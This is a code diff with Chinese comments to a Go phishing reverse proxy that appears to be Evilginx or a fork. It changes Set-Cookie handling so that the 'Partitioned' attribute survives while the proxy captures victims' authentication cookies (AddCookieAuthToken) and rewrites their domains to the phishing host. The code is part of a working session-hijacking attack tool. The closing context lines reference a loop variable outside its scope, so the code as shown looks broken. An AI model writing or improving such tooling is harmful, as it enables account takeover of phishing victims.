@@ -1429,52 +1429,68 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			is_cookie_auth := false
 			is_body_auth := false
 			is_http_auth := false
-			cookies := resp.Cookies()
+			// 保存原始 Set-Cookie 头，用于检测 Partitioned 等 Go 不支持的属性
+			rawCookies := resp.Header.Values("Set-Cookie")
 			resp.Header.Del("Set-Cookie")
-			for _, ck := range cookies {
-				// parse cookie
+			for _, rawCookie := range rawCookies {
+				// 检查原始 Set-Cookie 是否包含 Partitioned 属性（Go 的 http.Cookie 不支持此属性）
+				hasPartitioned := strings.Contains(rawCookie, "; Partitioned")
 
-				// add SameSite=none for every received cookie, allowing cookies through iframes
-				if ck.Secure {
-					ck.SameSite = http.SameSiteNoneMode
+				// 解析 cookie（http.ParseCookie 返回切片）
+				parsedCookies, err := http.ParseCookie(rawCookie)
+				if err != nil {
+					log.Warning("failed to parse cookie: %v", err)
+					continue
 				}
 
-				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
-					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
-					if err != nil {
-						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
+				for _, ck := range parsedCookies {
+					// add SameSite=none for every received cookie, allowing cookies through iframes
+					if ck.Secure {
+						ck.SameSite = http.SameSiteNoneMode
+					}
+
+					if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
+						exptime, err := time.Parse(time.RFC850, ck.RawExpires)
 						if err != nil {
-							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
+							exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
+							if err != nil {
+								exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
+							}
 						}
+						ck.Expires = exptime
 					}
-					ck.Expires = exptime
-				}
 
-				if pl != nil && ps.SessionId != "" {
-					c_domain := ck.Domain
-					if c_domain == "" {
-						c_domain = req_hostname
-					} else {
-						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
-						if c_domain[0] != '.' {
-							c_domain = "." + c_domain
+					if pl != nil && ps.SessionId != "" {
+						c_domain := ck.Domain
+						if c_domain == "" {
+							c_domain = req_hostname
+						} else {
+							// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
+							if c_domain[0] != '.' {
+								c_domain = "." + c_domain
+							}
 						}
-					}
-					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
-					at := pl.getAuthToken(c_domain, ck.Name)
-					if at != nil {
-						s, ok := p.sessions[ps.SessionId]
-						if ok && (s.IsAuthUrl || !s.IsDone) {
-							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
-								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
-								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, ck.Expires)
+						log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
+						at := pl.getAuthToken(c_domain, ck.Name)
+						if at != nil {
+							s, ok := p.sessions[ps.SessionId]
+							if ok && (s.IsAuthUrl || !s.IsDone) {
+								if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
+									log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
+									s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, ck.Expires)
+								}
 							}
 						}
 					}
-				}
 
-				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
-				resp.Header.Add("Set-Cookie", ck.String())
+					ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+					cookieStr := ck.String()
+					// 如果原始 cookie 包含 Partitioned 属性，追加到重新生成的 cookie 字符串
+					if hasPartitioned {
+						cookieStr += "; Partitioned"
+					}
+					resp.Header.Add("Set-Cookie", cookieStr)
+				}
 			}
 			if ck.String() != "" {
 				resp.Header.Add("Set-Cookie", ck.String())
